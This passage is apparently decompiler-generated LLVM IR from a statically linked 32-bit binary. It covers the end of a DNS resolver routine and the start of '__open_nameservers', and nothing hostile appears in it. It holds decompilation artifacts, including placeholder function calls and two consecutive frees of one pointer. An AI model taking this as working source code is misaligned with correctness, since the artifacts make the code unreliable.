  %v0_8056d9d = load i32, i32* @esp, align 4
  %v1_8056d9d = add i32 %v0_8056d9d, 16
  br label %dec_label_pc_8056da0

dec_label_pc_8056da0:                             ; preds = %dec_label_pc_8056ad2, %dec_label_pc_8056bfd, %dec_label_pc_8056bf5, %dec_label_pc_8056b91, %dec_label_pc_8056b17, %dec_label_pc_8056af3, %dec_label_pc_8056d93
  %v1_8056da7 = phi i32 [ %v1_8056ae7, %dec_label_pc_8056ad2 ], [ %v1_8056bee, %dec_label_pc_8056bfd ], [ %v1_8056bee, %dec_label_pc_8056bf5 ], [ %v1_8056b08, %dec_label_pc_8056b91 ], [ %v1_8056b08, %dec_label_pc_8056b17 ], [ %v1_8056b08, %dec_label_pc_8056af3 ], [ %v1_8056d9d, %dec_label_pc_8056d93 ]
  %v1_8056da0 = add i32 %v1_8056da7, 51
  %v2_8056da0 = inttoptr i32 %v1_8056da0 to i8*
  %v3_8056da0 = load i8, i8* %v2_8056da0, align 1
  %v4_8056da0 = icmp eq i8 %v3_8056da0, 0
  %v1_8056da5 = icmp eq i1 %v4_8056da0, false
  br i1 %v1_8056da5, label %dec_label_pc_8056deb, label %dec_label_pc_8056da7

dec_label_pc_8056da7:                             ; preds = %dec_label_pc_8056da0
  %v0_8056da7 = load i32, i32* @ecx, align 4
  %v2_8056da7 = add i32 %v1_8056da7, -4
  %v3_8056da7 = inttoptr i32 %v2_8056da7 to i32*
  store i32 %v0_8056da7, i32* %v3_8056da7, align 4
  %v1_8056da8 = add i32 %v1_8056da7, -8
  %v2_8056da8 = inttoptr i32 %v1_8056da8 to i32*
  store i32 ptrtoint (i32* @global_var_805e448.517 to i32), i32* %v2_8056da8, align 4
  %v1_8056dad = add i32 %v1_8056da7, -12
  %v2_8056dad = inttoptr i32 %v1_8056dad to i32*
  store i32 134567263, i32* %v2_8056dad, align 4
  %v1_8056db2 = add i32 %v1_8056da7, 184
  store i32 %v1_8056db2, i32* @esi, align 4
  %v2_8056db9 = add i32 %v1_8056da7, -16
  %v3_8056db9 = inttoptr i32 %v2_8056db9 to i32*
  store i32 %v1_8056db2, i32* %v3_8056db9, align 4
  %v2_8056dba = call i32 @__pthread_return_void(i32 -1, i32 %v15_805682c)
  store i32 %v2_8056dba, i32* %eax.global-to-local, align 4
  %v0_8056dbf = load i32, i32* @esp, align 4
  %v1_8056dbf = inttoptr i32 %v0_8056dbf to i32*
  store i32 ptrtoint (i32* @global_var_805e448.517 to i32), i32* %v1_8056dbf, align 4
  %v1_8056dc6 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8056dc6, i32* %eax.global-to-local, align 4
  %v0_8056dcb = load i32, i32* @global_var_8064b38.582, align 8
  store i32 %v0_8056dcb, i32* %ebx.global-to-local, align 4
  %v0_8056dd1 = load i32, i32* @esp, align 4
  %v1_8056dd1 = inttoptr i32 %v0_8056dd1 to i32*
  %v2_8056dd1 = load i32, i32* %v1_8056dd1, align 4
  store i32 %v2_8056dd1, i32* @eax, align 4
  %v3_8056dd1 = add i32 %v0_8056dd1, 4
  %v1_8056dd2 = inttoptr i32 %v3_8056dd1 to i32*
  %v2_8056dd2 = load i32, i32* %v1_8056dd2, align 4
  store i32 %v2_8056dd2, i32* %edx.global-to-local, align 4
  %v1_8056dd3 = add i32 %v0_8056dcb, -1
  store i32 %v1_8056dd3, i32* @ebx, align 4
  store i32 1, i32* %v1_8056dd2, align 4
  %v0_8056dd6 = load i32, i32* @esi, align 4
  store i32 %v0_8056dd6, i32* %v1_8056dd1, align 4
  %v2_8056dd7 = call i32 @__pthread_return_void(i32 -1, i32 %v15_805682c)
  store i32 %v2_8056dd7, i32* %eax.global-to-local, align 4
  %v0_8056ddc = load i32, i32* @esp, align 4
  %v1_8056ddc = add i32 %v0_8056ddc, 16
  %v1_8056ddf = add i32 %v0_8056ddc, 52
  %v2_8056ddf = inttoptr i32 %v1_8056ddf to i32*
  %v3_8056ddf = load i32, i32* %v2_8056ddf, align 4
  %v4_8056ddf = load i32, i32* @ebx, align 4
  %v5_8056ddf = sub i32 %v3_8056ddf, %v4_8056ddf
  %v11_8056ddf = xor i32 %v4_8056ddf, %v3_8056ddf
  %v12_8056ddf = xor i32 %v5_8056ddf, %v3_8056ddf
  %v13_8056ddf = and i32 %v12_8056ddf, %v11_8056ddf
  %v14_8056ddf = icmp slt i32 %v13_8056ddf, 0
  %v16_8056ddf = icmp slt i32 %v5_8056ddf, 0
  %v2_8056de3 = icmp eq i1 %v16_8056ddf, %v14_8056ddf
  br i1 %v2_8056de3, label %dec_label_pc_8056deb, label %dec_label_pc_8056de5

dec_label_pc_8056de5:                             ; preds = %dec_label_pc_8056da7
  %v4_8056de5 = add i32 %v3_8056ddf, 1
  store i32 %v4_8056de5, i32* %v2_8056ddf, align 4
  br label %dec_label_pc_8056e0c.backedge

dec_label_pc_8056deb:                             ; preds = %dec_label_pc_8056a74, %dec_label_pc_8056da7, %dec_label_pc_8056da0, %dec_label_pc_8056a8b
  %v1_8056dfa = phi i32 [ %v1_8056ddc, %dec_label_pc_8056da7 ], [ %v1_8056da7, %dec_label_pc_8056da0 ], [ %v1_8056ac7, %dec_label_pc_8056a8b ], [ %v0_8056deb.pre, %dec_label_pc_8056a74 ]
  %v1_8056deb = add i32 %v1_8056dfa, 40
  %v2_8056deb = inttoptr i32 %v1_8056deb to i32*
  %v3_8056deb = load i32, i32* %v2_8056deb, align 4
  %v1_8056def = add i32 %v3_8056deb, 1
  store i32 %v1_8056def, i32* %eax.global-to-local, align 4
  %v1_8056df0 = ashr i32 %v1_8056def, 31
  store i32 %v1_8056df0, i32* %edx.global-to-local, align 4
  %v1_8056df1 = add i32 %v1_8056dfa, 248
  %v2_8056df1 = inttoptr i32 %v1_8056df1 to i32*
  %v3_8056df1 = load i32, i32* %v2_8056df1, align 4
  %v5_8056df1 = zext i32 %v1_8056def to i64
  %v7_8056df1 = zext i32 %v1_8056df0 to i64
  %v8_8056df1 = mul nuw i64 %v7_8056df1, 4294967296
  %v9_8056df1 = or i64 %v8_8056df1, %v5_8056df1
  %v10_8056df1 = zext i32 %v3_8056df1 to i64
  %v11_8056df1 = sdiv i64 %v9_8056df1, %v10_8056df1
  %v12_8056df1 = trunc i64 %v11_8056df1 to i32
  store i32 %v12_8056df1, i32* %eax.global-to-local, align 4
  %v13_8056df1 = srem i64 %v9_8056df1, %v10_8056df1
  %v14_8056df1 = trunc i64 %v13_8056df1 to i32
  store i32 %v14_8056df1, i32* %edx.global-to-local, align 4
  %v1_8056df8 = icmp eq i32 %v14_8056df1, 0
  store i32 %v14_8056df1, i32* %v2_8056deb, align 4
  %v1_8056dfe = icmp eq i1 %v1_8056df8, false
  br i1 %v1_8056dfe, label %dec_label_pc_8056e04, label %dec_label_pc_8056e00

dec_label_pc_8056e00:                             ; preds = %dec_label_pc_8056deb
  %v0_8056e00 = load i32, i32* @esp, align 4
  %v1_8056e00 = add i32 %v0_8056e00, 28
  %v2_8056e00 = inttoptr i32 %v1_8056e00 to i32*
  %v3_8056e00 = load i32, i32* %v2_8056e00, align 4
  %v4_8056e00 = add i32 %v3_8056e00, 1
  store i32 %v4_8056e00, i32* %v2_8056e00, align 4
  br label %dec_label_pc_8056e04

dec_label_pc_8056e04:                             ; preds = %dec_label_pc_8056deb, %dec_label_pc_8056e00
  %v0_8056e04 = load i32, i32* @esp, align 4
  %v1_8056e04 = add i32 %v0_8056e04, 36
  %v2_8056e04 = inttoptr i32 %v1_8056e04 to i32*
  store i32 -1, i32* %v2_8056e04, align 4
  br label %dec_label_pc_8056e0c.backedge

dec_label_pc_8056e0c.backedge:                    ; preds = %dec_label_pc_8056e04, %dec_label_pc_8056a82, %dec_label_pc_8056b70, %dec_label_pc_8056de5
  %v0_8056e0c.pre = load i32, i32* @esp, align 4
  %v1_8056e0c = add i32 %v0_8056e0c.pre, 28
  %v2_8056e0c = inttoptr i32 %v1_8056e0c to i32*
  %v3_8056e0c = load i32, i32* %v2_8056e0c, align 4
  %tmp110 = icmp ult i32 %v3_8056e0c, 3
  br i1 %tmp110, label %dec_label_pc_805686c, label %dec_label_pc_8056e31

dec_label_pc_8056e31:                             ; preds = %dec_label_pc_80567e6, %dec_label_pc_8056882, %dec_label_pc_8056976, %dec_label_pc_8056e0c.backedge, %entry, %dec_label_pc_80567c0, %dec_label_pc_80567c8, %dec_label_pc_80567d6
  %stack_var_-180.0 = phi i16 [ -1, %dec_label_pc_80567d6 ], [ -1, %dec_label_pc_80567c8 ], [ -1, %dec_label_pc_80567c0 ], [ -1, %entry ], [ %v0_8056833, %dec_label_pc_8056e0c.backedge ], [ %v0_8056833, %dec_label_pc_8056976 ], [ %v0_8056833, %dec_label_pc_8056882 ], [ %v0_8056833, %dec_label_pc_80567e6 ]
  %v0_8056e31 = call i32 @__GI___h_errno_location()
  store i32 %v0_8056e31, i32* %eax.global-to-local, align 4
  %v1_8056e36 = inttoptr i32 %v0_8056e31 to i32*
  store i32 -1, i32* %v1_8056e36, align 4
  %v0_8056e3c = load i32, i32* @esp, align 4
  %v1_8056e3c = add i32 %v0_8056e3c, 56
  %v2_8056e3c = inttoptr i32 %v1_8056e3c to i32*
  %v3_8056e3c = load i32, i32* %v2_8056e3c, align 4
  store i32 %v3_8056e3c, i32* %eax.global-to-local, align 4
  %v2_8056e40 = add i32 %v0_8056e3c, 44
  %v3_8056e40 = inttoptr i32 %v2_8056e40 to i32*
  store i32 %v3_8056e3c, i32* %v3_8056e40, align 4
  br label %dec_label_pc_8056e44

dec_label_pc_8056e44:                             ; preds = %dec_label_pc_8056ba9, %dec_label_pc_8056b81, %dec_label_pc_8056e31
  %stack_var_-180.1 = phi i16 [ %stack_var_-180.0, %dec_label_pc_8056e31 ], [ %v0_8056833, %dec_label_pc_8056ba9 ], [ %v0_8056833, %dec_label_pc_8056b81 ]
  %v0_8056e44 = load i32, i32* @esp, align 4
  %v1_8056e44 = add i32 %v0_8056e44, 20
  %v2_8056e44 = inttoptr i32 %v1_8056e44 to i32*
  %v3_8056e44 = load i32, i32* %v2_8056e44, align 4
  %v13_8056e44 = icmp eq i32 %v3_8056e44, -1
  br i1 %v13_8056e44, label %dec_label_pc_8056e44.dec_label_pc_8056e5a_crit_edge, label %dec_label_pc_8056e4b

dec_label_pc_8056e44.dec_label_pc_8056e5a_crit_edge: ; preds = %dec_label_pc_8056e44
  %.pre = sext i16 %stack_var_-180.1 to i32
  br label %dec_label_pc_8056e5a

dec_label_pc_8056e4b:                             ; preds = %dec_label_pc_8056e44
  %v3_8056e4e = load i32, i32* %v2_8056e44, align 4
  %v5_8056e4e = add i32 %v0_8056e44, -16
  %v6_8056e4e = inttoptr i32 %v5_8056e4e to i32*
  store i32 %v3_8056e4e, i32* %v6_8056e4e, align 4
  %v1_8056e52 = sext i16 %stack_var_-180.1 to i32
  %v2_8056e52 = call i32 @__libc_close(i32 %v1_8056e52)
  store i32 %v2_8056e52, i32* %eax.global-to-local, align 4
  %v0_8056e57 = load i32, i32* @esp, align 4
  %v1_8056e57 = add i32 %v0_8056e57, 16
  br label %dec_label_pc_8056e5a

dec_label_pc_8056e5a:                             ; preds = %dec_label_pc_8056e44.dec_label_pc_8056e5a_crit_edge, %dec_label_pc_8056e4b
  %v1_8056e61.pre-phi = phi i32 [ %.pre, %dec_label_pc_8056e44.dec_label_pc_8056e5a_crit_edge ], [ %v1_8056e52, %dec_label_pc_8056e4b ]
  %v0_8056e5a = phi i32 [ %v0_8056e44, %dec_label_pc_8056e44.dec_label_pc_8056e5a_crit_edge ], [ %v1_8056e57, %dec_label_pc_8056e4b ]
  %v1_8056e5d = add i32 %v0_8056e5a, 12
  %v2_8056e5d = inttoptr i32 %v1_8056e5d to i32*
  %v3_8056e5d = load i32, i32* %v2_8056e5d, align 4
  %v5_8056e5d = add i32 %v0_8056e5a, -16
  %v6_8056e5d = inttoptr i32 %v5_8056e5d to i32*
  store i32 %v3_8056e5d, i32* %v6_8056e5d, align 4
  %v2_8056e61 = call i32 @free(i32 %v1_8056e61.pre-phi)
  store i32 %v2_8056e61, i32* %eax.global-to-local, align 4
  %v1_8056e66 = load i32, i32* @esp, align 4
  %v2_8056e66 = inttoptr i32 %v1_8056e66 to i32*
  store i32 %v2_805679e, i32* %v2_8056e66, align 4
  %v2_8056e69 = call i32 @free(i32 %v1_8056e61.pre-phi)
  store i32 %v2_8056e69, i32* @eax, align 4
  %v0_8056e6e = load i32, i32* @esp, align 4
  %v1_8056e71 = add i32 %v0_8056e6e, 56
  %v2_8056e71 = inttoptr i32 %v1_8056e71 to i32*
  %v3_8056e71 = load i32, i32* %v2_8056e71, align 4
  %v13_8056e71 = icmp eq i32 %v3_8056e71, -1
  %v1_8056e76 = add i32 %v0_8056e6e, 32
  %v2_8056e76 = inttoptr i32 %v1_8056e76 to i32*
  store i32 -1, i32* %v2_8056e76, align 4
  br i1 %v13_8056e71, label %dec_label_pc_8056e5a.dec_label_pc_8056ecd_crit_edge, label %dec_label_pc_8056e80

dec_label_pc_8056e5a.dec_label_pc_8056ecd_crit_edge: ; preds = %dec_label_pc_8056e5a
  %v0_8056ecd.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056ecd

dec_label_pc_8056e80:                             ; preds = %dec_label_pc_8056e5a
  %v0_8056e80 = load i32, i32* @ecx, align 4
  %v1_8056e80 = load i32, i32* @esp, align 4
  %v2_8056e80 = add i32 %v1_8056e80, -4
  %v3_8056e80 = inttoptr i32 %v2_8056e80 to i32*
  store i32 %v0_8056e80, i32* %v3_8056e80, align 4
  %v1_8056e81 = add i32 %v1_8056e80, -8
  %v2_8056e81 = inttoptr i32 %v1_8056e81 to i32*
  store i32 ptrtoint (i8** @global_var_80646e8.579 to i32), i32* %v2_8056e81, align 4
  %v1_8056e86 = add i32 %v1_8056e80, -12
  %v2_8056e86 = inttoptr i32 %v1_8056e86 to i32*
  store i32 134567263, i32* %v2_8056e86, align 4
  %v1_8056e8b = add i32 %v1_8056e80, 184
  store i32 %v1_8056e8b, i32* %ebx.global-to-local, align 4
  %v2_8056e92 = add i32 %v1_8056e80, -16
  %v3_8056e92 = inttoptr i32 %v2_8056e92 to i32*
  store i32 %v1_8056e8b, i32* %v3_8056e92, align 4
  %v3_8056e93 = call i32 @__pthread_return_void(i32 %v1_8056e61.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8056e93, i32* %eax.global-to-local, align 4
  %v0_8056e98 = load i32, i32* @esp, align 4
  %v1_8056e98 = inttoptr i32 %v0_8056e98 to i32*
  store i32 ptrtoint (i8** @global_var_80646e8.579 to i32), i32* %v1_8056e98, align 4
  %v2_8056e9f = call i32 @__pthread_return_0(i32 %v1_8056e61.pre-phi)
  store i32 %v2_8056e9f, i32* %eax.global-to-local, align 4
  %v0_8056ea4 = load i32, i32* @esp, align 4
  %v1_8056ea4 = add i32 %v0_8056ea4, 60
  %v2_8056ea4 = inttoptr i32 %v1_8056ea4 to i32*
  %v3_8056ea4 = load i32, i32* %v2_8056ea4, align 4
  store i32 %v3_8056ea4, i32* %eax.global-to-local, align 4
  %v1_8056ea8 = add i32 %v0_8056ea4, 56
  %v2_8056ea8 = inttoptr i32 %v1_8056ea8 to i32*
  %v3_8056ea8 = load i32, i32* %v2_8056ea8, align 4
  store i32 %v3_8056ea8, i32* %edx.global-to-local, align 4
  %v1_8056eac = trunc i32 %v3_8056ea4 to i16
  store i16 %v1_8056eac, i16* @global_var_805e444.581, align 4
  %v1_8056eb2 = inttoptr i32 %v0_8056ea4 to i32*
  %v2_8056eb2 = load i32, i32* %v1_8056eb2, align 4
  store i32 %v2_8056eb2, i32* @eax, align 4
  %v3_8056eb2 = add i32 %v0_8056ea4, 4
  %v1_8056eb3 = sext i32 %v3_8056ea8 to i64
  store i64 %v1_8056eb3, i64* @global_var_8064700.580, align 256
  %v1_8056eb9 = inttoptr i32 %v3_8056eb2 to i32*
  %v2_8056eb9 = load i32, i32* %v1_8056eb9, align 4
  store i32 %v2_8056eb9, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8056eb9, align 4
  %v0_8056ebc = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8056ebc, i32* %v1_8056eb2, align 4
  %v3_8056ebd = call i32 @__pthread_return_void(i32 %v1_8056e61.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8056ebd, i32* %eax.global-to-local, align 4
  %v0_8056ec2 = load i32, i32* @esp, align 4
  %v1_8056ec2 = add i32 %v0_8056ec2, 32
  %v2_8056ec2 = inttoptr i32 %v1_8056ec2 to i32*
  store i32 -1, i32* %v2_8056ec2, align 4
  br label %dec_label_pc_8056eca

dec_label_pc_8056eca:                             ; preds = %dec_label_pc_8056d3e, %dec_label_pc_8056e80
  %v0_8056eca = load i32, i32* @esp, align 4
  %v1_8056eca = add i32 %v0_8056eca, 16
  br label %dec_label_pc_8056ecd

dec_label_pc_8056ecd:                             ; preds = %dec_label_pc_8056e5a.dec_label_pc_8056ecd_crit_edge, %dec_label_pc_8056eca
  %v0_8056ecd = phi i32 [ %v0_8056ecd.pre, %dec_label_pc_8056e5a.dec_label_pc_8056ecd_crit_edge ], [ %v1_8056eca, %dec_label_pc_8056eca ]
  %v1_8056ecd = add i32 %v0_8056ecd, 16
  %v2_8056ecd = inttoptr i32 %v1_8056ecd to i32*
  %v3_8056ecd = load i32, i32* %v2_8056ecd, align 4
  store i32 %v3_8056ecd, i32* %eax.global-to-local, align 4
  %v1_8056ed1 = add i32 %v0_8056ecd, 220
  %v1_8056ed7 = inttoptr i32 %v1_8056ed1 to i32*
  %v2_8056ed7 = load i32, i32* %v1_8056ed7, align 4
  store i32 %v2_8056ed7, i32* @ebx, align 4
  %v3_8056ed7 = add i32 %v0_8056ecd, 224
  %v1_8056ed8 = inttoptr i32 %v3_8056ed7 to i32*
  %v2_8056ed8 = load i32, i32* %v1_8056ed8, align 4
  store i32 %v2_8056ed8, i32* @esi, align 4
  %v3_8056ed8 = add i32 %v0_8056ecd, 228
  %v1_8056ed9 = inttoptr i32 %v3_8056ed8 to i32*
  %v2_8056ed9 = load i32, i32* %v1_8056ed9, align 4
  store i32 %v2_8056ed9, i32* @edi, align 4
  %v3_8056ed9 = add i32 %v0_8056ecd, 232
  %v1_8056eda = inttoptr i32 %v3_8056ed9 to i32*
  %v2_8056eda = load i32, i32* %v1_8056eda, align 4
  store i32 %v2_8056eda, i32* @ebp, align 4
  ret i32 %v3_8056ecd

; uselistorder directives
  uselistorder i32 %v0_8056ecd, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8056ea4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8056e5a, { 1, 0 }
  uselistorder i32 %v1_8056e61.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-180.1, { 1, 0 }
  uselistorder i32 %v0_8056e0c.pre, { 1, 0 }
  uselistorder i32 %v5_8056ddf, { 1, 0 }
  uselistorder i32 %v3_8056ddf, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8056da7, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8056d70, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8056d3e, { 1, 0 }
  uselistorder i32 %v3_8056d1d, { 1, 0, 2 }
  uselistorder i32 %v0_8056d0e, { 1, 0 }
  uselistorder i32 %v5_8056d04, { 1, 0 }
  uselistorder i32* %v3_8056d04, { 1, 0 }
  uselistorder i32 %v0_8056bda67, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8056d04, { 2, 1, 0 }
  uselistorder i32 %v5_8056cfe, { 1, 0 }
  uselistorder i32 %v1_8056cfd, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8056cf9, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8056cbd, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_8056c97, { 1, 0 }
  uselistorder i32 %v1_8056c88, { 1, 0 }
  uselistorder i32 %v3_8056c59, { 2, 3, 0, 1 }
  uselistorder i32 %v0_8056c47, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8056bee, { 1, 2, 0 }
  uselistorder i32 %v0_8056bee, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_8056bc8, { 1, 0 }
  uselistorder i32 %v0_8056bd0, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_8056bbe, { 1, 0, 2 }
  uselistorder i32 %v5_8056b6a, { 1, 0 }
  uselistorder i32* %v2_8056b6a, { 1, 0, 2 }
  uselistorder i32 %v3_8056b22, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8056b08, { 0, 8, 1, 2, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32 %v0_8056ae7, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8056ac7, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8056a6d, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8056a52, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_8056a3b, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_80569c3, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8056976, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8056957, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_805693b, { 1, 0 }
  uselistorder i32 %v3_8056930, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_805692d, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_80568d2, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_80568cd, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80568b6, { 1, 0 }
  uselistorder i32 %v1_8056882, { 3, 2, 1, 0 }
  uselistorder i32 %v0_805687383, { 2, 1, 0 }
  uselistorder i16 %v0_8056833, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %v15_805682c, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_805679e, { 1, 5, 2, 6, 11, 3, 7, 10, 0, 4, 8, 9, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 82, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 70, 66, 67, 68, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 83, 84, 85, 86, 87, 88 }
  uselistorder i32 248, { 1, 0 }
  uselistorder i32 51, { 9, 8, 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32 136, { 1, 2, 0 }
  uselistorder i32 132, { 1, 2, 0 }
  uselistorder i32 148, { 1, 2, 0 }
  uselistorder i32 160, { 1, 4, 2, 3, 0 }
  uselistorder i32 68, { 3, 2, 4, 5, 1, 0 }
  uselistorder i32 27, { 2, 3, 1, 0 }
  uselistorder i32 100, { 1, 5, 3, 4, 2, 0 }
  uselistorder i32 67, { 1, 2, 0 }
  uselistorder i32 112, { 1, 5, 6, 7, 3, 4, 2, 0 }
  uselistorder i32 88, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 4, 3, 2, 0 }
  uselistorder i32 10000, { 9, 0, 1, 2, 3, 4, 6, 7, 5, 8 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 1, 6, 5, 11, 10, 9, 8, 7, 4, 3, 2, 0 }
  uselistorder i32 101, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 1, 0, 7, 6, 5, 4, 3, 8, 2 }
  uselistorder i32 (i32, i32, i32)* @socket, { 2, 1, 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 12 }
  uselistorder i32 17, { 15, 13, 5, 12, 2, 3, 1, 6, 7, 8, 9, 17, 4, 16, 14, 10, 11, 0 }
  uselistorder i32 176, { 2, 3, 4, 1, 0 }
  uselistorder i32 (i32)* @inet_addr, { 4, 1, 5, 3, 2, 0 }
  uselistorder i32 158, { 1, 0 }
  uselistorder i32 156, { 1, 2, 0 }
  uselistorder i32 172, { 1, 2, 3, 0 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 3, 1, 2, 0 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 200, { 2, 1, 3, 4, 0 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 0, 2, 3, 1 }
  uselistorder i32 104, { 3, 1, 4, 2, 0 }
  uselistorder i32 116, { 1, 3, 4, 2, 0 }
  uselistorder i32 72, { 1, 3, 4, 2, 5, 0 }
  uselistorder i32 84, { 4, 1, 5, 2, 6, 3, 0 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 13, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 50, 51, 47, 48, 49, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 66, 67, 64, 65 }
  uselistorder i32 -12, { 12, 6, 5, 7, 1, 8, 9, 10, 11, 0, 13, 26, 25, 24, 2, 18, 14, 3, 15, 16, 17, 19, 20, 4, 22, 21, 23, 27 }
  uselistorder i32 -8, { 9, 3, 2, 4, 0, 5, 6, 7, 8, 10, 22, 23, 24, 21, 1, 16, 11, 12, 13, 14, 15, 17, 18, 19, 20 }
  uselistorder i16 1, { 1, 0 }
  uselistorder i16* @global_var_805e444.581, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 0, 2 }
  uselistorder i64* @global_var_8064700.580, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_80646e8.579 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_80646e8.579, { 1, 0 }
  uselistorder i32 1025, { 5, 6, 7, 0, 1, 2, 4, 3 }
  uselistorder i32 512, { 6, 3, 7, 8, 4, 5, 0, 1, 2 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8056ecd, { 1, 0 }
  uselistorder label %dec_label_pc_8056eca, { 1, 0 }
  uselistorder label %dec_label_pc_8056e5a, { 1, 0 }
  uselistorder label %dec_label_pc_8056e44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056e31, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_8056e0c.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8056e04, { 1, 0 }
  uselistorder label %dec_label_pc_8056deb, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8056da0, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8056d3e, { 1, 0 }
  uselistorder label %dec_label_pc_8056d0e, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8056d04, { 1, 0 }
  uselistorder label %dec_label_pc_8056cf9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056cf6, { 1, 0 }
  uselistorder label %dec_label_pc_8056c71, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8056bc8, { 1, 0 }
  uselistorder label %dec_label_pc_8056a3b, { 1, 0 }
  uselistorder label %dec_label_pc_8056a04, { 1, 0 }
  uselistorder label %dec_label_pc_8056976, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056882, { 1, 0 }
  uselistorder label %dec_label_pc_805686c, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_8056edc = load i32, i32* @ebp, align 4
  store i32 134567263, i32* %stack_var_-216, align 4
  %v3_8056eeb = ptrtoint i32* %stack_var_-216 to i32
  %v2_8056ef0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8056ef0, i32* @eax, align 4
  %v2_8056ef8 = call i32 @__pthread_return_void(i32 %v2_8056ef0, i32 134567263)
  %v1_8056f04 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805e448.517 to i32))
  store i32 %v1_8056f04, i32* @eax, align 4
  %v0_8056f0c = load i32, i32* @global_var_8064b34.518, align 4
  %tmp41 = icmp slt i32 %v0_8056f0c, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_8057103, label %dec_label_pc_8056f19

dec_label_pc_8056f19:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_805d470.584 to i32), i32* %stack_var_-216, align 4
  %v2_8056f25 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_805d43e.585 to i32), i32 ptrtoint (i32* @global_var_805d470.584 to i32))
  store i32 %v2_8056f25, i32* @eax, align 4
  %v1_8056f2d = icmp eq i32 %v2_8056f25, 0
  store i32 %v2_8056f25, i32* @ebp, align 4
  %v1_8056f31 = icmp eq i1 %v1_8056f2d, false
